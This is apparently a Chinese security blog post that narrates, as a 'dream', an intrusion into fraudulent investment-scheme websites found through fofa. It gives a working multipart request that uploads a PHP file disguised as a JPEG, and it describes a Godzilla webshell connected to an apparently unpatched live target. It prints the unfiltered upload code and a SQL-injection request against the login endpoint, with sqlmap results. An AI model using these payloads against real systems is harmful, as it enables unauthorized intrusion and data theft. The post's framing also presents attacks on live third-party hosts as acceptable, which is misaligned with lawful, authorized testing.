#  【吾好梦中测站】一次资金盘渗透的源码爬取与0day挖掘实录   
原创 菜狗安全  菜狗安全   2025-04-29 00:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbYIByxEDn9vF4hhNXdT8CTSgyPPuXUMgKvhEnLB3uETictJWV83Akic1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThblPVAndvyTpQFwq1A0r1dWhvB7eMS9aib6BWewwHCOepINib6su4KMIibw/640?wx_fmt=gif&from=appmsg "")  
  
点击上方蓝字·关注我们  
  
  
免责声明  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
  
由于传播、利用本公众号  
菜狗安全  
所提供的信息而造成的任何直接或者间接的后果及损失，均由  
使用者本人负责，公众号  
菜狗安全  
及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，会立即删除并致歉。  
  
文章目录  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
```
前言：一场离奇的梦中渗透
第一章 梦中的信息收集
第二章 梦境中的漏洞复现
第三章 梦境突破
    前台上传点分析
    前台SQL注入挖掘
第四章 梦醒时分
```  
  
2sdfsf  
  
  
**前言：一场离奇的梦中渗透**  
# 昨晚在备公开课的课件(精选挑选案例源码)中，不曾想由于太过劳累，趴在电脑前不慎睡着，竟在梦中看到一个神秘的网站界面。更诡异的是，梦中的我鬼使神差地对它展开了渗透测试...  
### 第一章 梦中的信息收集  
# 打开目标  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVVmXmNVibvGowvlVKoCsicxrAh2GuD5AOml7835sHoicE9icCyJhmCPicDvA/640?wx_fmt=png&from=appmsg "")  
# 通过网站名称查找信息，发现是个资金盘，搞传销诈骗的  
# 通过翻找js，看下能否发现特有指纹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hV83oeYN8a0GVZxxto2picHFUoFQOFmA54d6LqmsrzfUDv152PwGJxbwQ/640?wx_fmt=png&from=appmsg "")  
# fofa启动  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVrpY9wiap5ztv0icKj1jichNnuF76IGvd7mabV5MvjmbdwUkTNhy0iaBftQ/640?wx_fmt=png&from=appmsg "")  
# 翻看几个目标发现确实大部分是同类型网站(除UI不同)，在网上寻找系统信息，发现使用的是某商城系统，这套系统有披露过个前台文件上传  
### 第二章 梦境中的漏洞复现  
  
梦中手指不受控制地输入了测试POC：  
```
POST /Login/shangchuan HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg
Host: {{ip:port}}
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```  
  
但系统却像被无形屏障保护着返回302，应该是修复了  
# 于是乎只能转头看向其它目标，看能不能找到个没修的，还真让我发现有一个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVMCzUdg5QP1elNxZLvOavusOGeIz2Itv62agOOlVUSiblu1A7XkvVDaQ/640?wx_fmt=png&from=appmsg "")  
### 第三章 梦境突破  
  
随着哥斯拉 成功连接，整个系统的源码像数据洪流般涌入我的意识。梦中的我竟开始自动审计代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVYfTnTKQRNmXPib8k3dr7oicIWo0JficgyMnsz6ucjTV1LRG246jGicY8fg/640?wx_fmt=png&from=appmsg "")  
  
**前台上传点分析**  
# 这个是顺带分析的  
# 根据漏洞复现路由定位对应class文件和方法  
# 对应文件:Home/Controller/LoginController.class.php  
# 对应方法：shangchuan()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVDMEoTTImrwkkguQsQQEyWd76NicibPM6gCibVlj6W3ljON81ibh3SyAPibw/640?wx_fmt=png&from=appmsg "")  
# 跟进upload_file  
```
/**
 * 上传文件函数
 * 
 * 该函数负责处理文件上传过程，根据提供的文件信息和类型，将文件上传到指定目录
 * 它首先确定文件的存储路径，并创建路径对应的目录，然后将文件移动到该路径下
 * 
 * @param array $files 文件信息数组，包含文件的临时路径、文件名等信息
 * @param string $type 文件类型，目前在函数中未使用，但可能用于未来扩展
 * 
 * @return array|string 返回一个包含文件上传结果的数组，或在上传失败时返回错误信息
 */
function upload_file($files,$type){
    // 获取文件名
    $name = array_keys($files);
    $name = $name[0];
    // 获取文件扩展名
    $ext = extend($files[$name]['name']);
    // 定义上传目录，根据当前日期动态创建目录路径
    $img_url = "./Uploads/txt/".date('Y-m-d',time()).'/';
    // 检查上传目录是否存在，如果不存在则创建
    if (!file_exists($img_url)) {
       mkdir($img_url,0777,true);
       //echo $img_url; die;
    }
    // 生成唯一文件名，防止重名
    $image_name = time().rand(100,999).".".$ext;//图片名字
    // 获取文件的临时名字
    $tmp = $files[$name]['tmp_name'];//临时名字

    // 尝试将文件从临时路径移动到上传目录下
    if(move_uploaded_file($tmp,$img_url.$image_name)){
        // 如果上传成功，返回文件的相对路径
        $arr['re']=ltrim($img_url.$image_name,'.');
        $arr['code']=200;
        return $arr;
        // return ltrim($img_url.$image_name,'.');
    }else{
        // 如果上传失败，返回错误信息
        return 'error';
    }
}
```  
# 代码完全没有任何过滤，直接文件上传，造成RCE  
# 前台SQL注入挖掘  
# thinkphp框架，搜索关键词where(  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVPf5942jRwREmlJiaJAnYswUicXiaLO7HNFD1AHfK4ZPMw7ibqT7FIl5ia6Q/640?wx_fmt=png&from=appmsg "")  
# 大部分都是参数绑定形式，还是让我找到了一处危险写法  
# 对应文件：Home/Controller/LoginController.class.php  
# 对应方法：login_action()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVnmLep2FL4rqngclA1ko3FZKZudxliboLbMwItB4cataWaazaJYRmV1w/640?wx_fmt=png&from=appmsg "")  
# 这里where的内容不是参数绑定也不是数组形式，只有一个参数不会触发框架预防机制，存在注入，$member_number通过Thinkphp I()函数获取,也就是可控  
# 测试数据包  
```
POST /Login/login_action.html HTTP/1.1
Host: {{ip:port}}
Connection: keep-alive
Content-Length: 47
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=i7fc7spel83kcd4t7afg4fdhl0

member_number=123123*&member_pwd=123123123&ty=on
```  
# sqlmap结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlu8MibauV25IibJuxb8nN4hVkkWDUkKfzGiaG2whEZH3DE4Chzp9NofJGRIldYYCyEqzEp9Uo8Ubrvg/640?wx_fmt=png&from=appmsg "")  
  
第四章 梦醒时分  
  
当sqlmap成功后，就在我准备进一步dump数据时，眼前的终端突然闪烁，像是信号不良的老旧电视。我猛地伸手去抓，却发现键盘消失了，屏幕上的字符开始扭曲、溶解。  
  
"等等！我还没记下域名！"  
  
但梦境不讲道理，它像退潮的海水一样迅速抽离。我拼命回忆，却只能捕捉到几个零散的片段：  
- **一个红色的LOGO**  
（但具体是什么图案？）  
  
- **登录界面的背景是星空图**  
（但网址呢？网址呢？！）  
  
我甚至不确定这个网站是否真的存在，还是我的大脑把某个系统源码、某个渗透测试项目、某个随手翻过的漏洞报告，全部糅合在一起，编织出的一场渗透幻梦。  
  
**回归现实：接着写课件**  
  
闹钟响了。  
  
我盯着电脑屏幕，发现课件才写到一半，浏览器里只有搭建的本地环境，没有任何其它域名的访问记录。  
  
"算了，先干活吧。"  
  
我关掉终端，继续写我的公开课课件。但手指刚碰到键盘，突然停住了——  
  
**等等，那个SQL注入的Payload，是不是真的能用？**  
  
我鬼使神差地打开yakit，在历史记录里翻找，但什么也没找到。  
  
也许，它真的只是一个梦。  
  
或者……  
  
**它只是还没被发现。**  
# 最后  
  
二期公开课  
《PHP代码审计速成》持续更新中...  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPkp2zicq3IJiajmo3kicxXOWwdFP3GjBSVIg2gNk5ONfHTNn4JHXribia3rhzrbRccXcMegoviaYBtZYIibA/640?wx_fmt=png&from=appmsg "")  
# 直播通知和课件都会在交流群中发布，有需要的师傅可以加我VX，备注：交流群，我拉你进群  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPmic8RYXMickJZbXfFDicmYbdzTb4XdVfibZH9IicN9uAezcmaqbHLP929dS7AfmybpqpczicmicZzNM42AQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
性感群主不定期在线水群解答问题  
  
  
  
